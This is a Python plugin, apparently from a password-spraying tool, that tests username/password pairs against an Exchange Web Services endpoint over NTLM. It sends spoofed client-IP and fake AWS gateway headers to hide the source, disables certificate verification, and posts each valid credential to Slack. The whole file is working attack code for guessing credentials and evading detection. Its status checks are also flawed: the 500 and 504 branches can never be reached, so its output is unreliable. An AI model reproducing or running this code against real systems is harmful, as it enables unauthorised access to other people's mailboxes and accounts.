import datetime, requests
from requests_ntlm import HttpNtlmAuth
import utils.utils as utils
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def ews_authenticate(url, username, password, useragent, pluginargs):

    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

    data_response = {
        'timestamp': ts,
        'username': username,
        'password': password,
        'success': False,
        'change': False,
        '2fa_enabled': False,
        'type': None,
        'code': None,
        'name': None,
        'action': None,
        'headers': [],
        'cookies': [],
        'sourceip' : None,
        'throttled' : False,
        'error' : False,
        'output' : ""
    }

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    headers = {
        'User-Agent': useragent,
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,

        "Content-Type": "text/xml"
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    try:

        resp = requests.post("{}/ews/".format(url), headers=headers, auth=HttpNtlmAuth(username, password), verify=False)

        if resp.status_code != 401:
            data_response['success'] = True
            data_response['output'] = utils.prGreen(f"[+] Found credentials, code: {resp.status_code}: {username}:{password}")
            utils.slacknotify(username, password)
        elif resp.status_code == 500:
            data_response['output'] = utils.prYellow(f"[*] WARNING: Found credentials, but server returned 500: {username}:{password}")
            data_response['success'] = False 
            utils.slacknotify(username, password)
        elif resp.status_code == 504:
            data_response['output'] = utils.prYellow(f"[*] Potential Credentials, but server returned 504: {username}:{password}")
            data_response['success'] = False 
        else:
            data_response['success'] = False
            data_response['output'] = utils.prRed(f"[-] Authentication failed: {username}:{password} (Invalid credentials)")


    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
